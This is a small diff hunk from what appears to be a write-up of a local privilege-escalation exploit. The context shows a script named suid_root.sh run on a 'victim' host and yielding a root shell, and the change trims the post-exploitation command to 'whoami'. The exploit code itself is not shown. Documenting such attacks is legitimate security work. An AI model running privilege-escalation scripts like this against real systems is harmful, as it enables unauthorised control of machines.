@@ -18,7 +18,7 @@ user@victim:/tmp$ ./suid_root.sh
 Process 436 detected
 Child process is finished, exiting...
 [+]  getting a shell as root.. 
-bash-5.0# whoami && id && hostname
+bash-5.0# whoami
 root
 ```
 
